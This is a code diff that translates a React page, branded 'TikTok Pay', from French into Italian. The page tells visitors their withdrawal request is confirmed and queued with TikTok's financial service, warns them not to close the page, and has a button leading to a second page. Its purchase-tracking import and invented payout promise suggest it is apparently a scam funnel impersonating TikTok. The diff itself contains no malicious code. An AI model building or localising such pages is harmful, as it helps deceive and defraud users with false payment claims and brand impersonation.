@@ -6,15 +6,15 @@ import { useTikTokPurchase } from "@/lib/purchase-tracking";
 export const Route = createFileRoute("/obrigado")({
   head: () => ({
     meta: [
-      { title: "Demande confirmée | TikTok Pay" },
+      { title: "Richiesta confermata | TikTok Pay" },
       {
         name: "description",
-        content: "Votre demande de retrait a bien été reçue. Traitement en cours.",
+        content: "La tua richiesta di prelievo è stata ricevuta. Elaborazione in corso.",
       },
-      { property: "og:title", content: "Demande confirmée" },
+      { property: "og:title", content: "Richiesta confermata" },
       {
         property: "og:description",
-        content: "Votre demande de retrait a bien été reçue. Traitement en cours.",
+        content: "La tua richiesta di prelievo è stata ricevuta. Elaborazione in corso.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -43,7 +43,7 @@ function Obrigado() {
           <svg viewBox="0 0 24 24" className="h-4 w-4" fill="currentColor">
             <path d="M12 2L1 21h22L12 2zm0 3.45L19.53 19H4.47L12 5.45zM11 16h2v2h-2v-2zm0-7h2v5h-2V9z" />
           </svg>
-          IMPORTANT : NE FERMEZ PAS CETTE PAGE AVANT D’AVOIR TOUT LU.
+          IMPORTANTE: NON CHIUDERE QUESTA PAGINA PRIMA DI AVER LETTO TUTTO.
         </p>
       </div>
 
@@ -74,26 +74,26 @@ function Obrigado() {
         <div className="mb-6">
           <span className="inline-flex items-center gap-2 rounded-full border border-[#25d366]/20 bg-[#25d366]/5 px-4 py-1.5 text-[12px] font-bold text-[#25d366] uppercase tracking-wider">
             <span className="h-2 w-2 rounded-full bg-[#25d366] animate-pulse" />
-            Demande confirmée
+            Richiesta confermata
           </span>
         </div>
 
         {/* Main Title */}
         <h1 className="mb-8 text-[32px] font-black leading-[1.1] text-[#161823]">
-          Votre demande de retrait a bien été <span className="bg-gradient-to-r from-[#ff3b5c] via-[#25f4ee] to-[#161823] bg-clip-text text-transparent">enregistrée !</span>
+          La tua richiesta di prelievo è stata <span className="bg-gradient-to-r from-[#ff3b5c] via-[#25f4ee] to-[#161823] bg-clip-text text-transparent">registrata!</span>
         </h1>
 
         {/* Info Card */}
         <div className="w-full rounded-[24px] bg-white p-8 shadow-[0_20px_50px_rgba(0,0,0,0.06)] text-left mb-8 border border-neutral-100">
           <p className="mb-6 text-[15px] leading-relaxed text-[#161823]">
-            En raison du <span className="font-bold text-[#ff3b5c]">nombre élevé de demandes de retrait</span>, votre dossier sera traité sous <span className="font-bold underline underline-offset-2">7 jours ouvrés maximum.</span>
+            A causa dell'<span className="font-bold text-[#ff3b5c]">elevato numero di richieste di prelievo</span>, la tua pratica sarà elaborata entro <span className="font-bold underline underline-offset-2">massimo 7 giorni lavorativi.</span>
           </p>
 
           <ul className="space-y-5">
             {[
-              "Votre paiement est dans la file de traitement du service financier TikTok.",
-              "Vous recevrez le virement directement sur le moyen choisi lors de votre demande.",
-              "Aucune action supplémentaire n’est nécessaire de votre part.",
+              "Il tuo pagamento è nella coda di elaborazione del servizio finanziario TikTok.",
+              "Riceverai il bonifico direttamente sul metodo scelto durante la tua richiesta.",
+              "Non è richiesta nessuna azione aggiuntiva da parte tua.",
             ].map((text, i) => (
               <li key={i} className="flex items-start gap-3">
                 <svg
@@ -115,7 +115,7 @@ function Obrigado() {
 
         {/* Footer Text */}
         <p className="mb-10 text-[12px] italic leading-relaxed text-[#8a8a8e] px-4">
-          Merci de votre patience. L’équipe TikTok Pay met tout en œuvre pour débloquer votre paiement au plus vite.
+          Grazie per la pazienza. Il team di TikTok Pay sta facendo il possibile per sbloccare il tuo pagamento il prima possibile.
         </p>
 
         {/* CTA Button */}
@@ -123,7 +123,7 @@ function Obrigado() {
           onClick={() => navigate({ to: "/obrigado2" })}
           className="w-full rounded-2xl bg-[#ff3b5c] py-5 text-[18px] font-black text-white shadow-[0_10px_30px_rgba(255,59,92,0.3)] transition-all hover:brightness-110 active:scale-[0.98]"
         >
-          CONTINUER
+          CONTINUA
         </button>
       </section>
     </main>
